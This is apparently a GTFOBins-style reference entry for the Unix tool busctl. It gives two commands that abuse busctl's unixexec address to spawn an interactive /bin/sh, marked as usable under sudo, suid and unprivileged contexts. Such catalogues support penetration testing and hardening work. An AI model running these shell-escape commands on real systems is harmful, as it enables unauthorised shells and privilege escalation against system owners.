---
type: gtfobin
name: busctl
platform: Unix
functions: [inherit, shell]
tags: [gtfobin, unix, lotl]
---

# busctl

## inherit

```bash
busctl --show-machine
```
**Contexts:** sudo, suid, unprivileged

## shell

```bash
busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'
```
**Contexts:** sudo, suid, unprivileged

```bash
busctl --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'
```
**Contexts:** sudo, suid, unprivileged
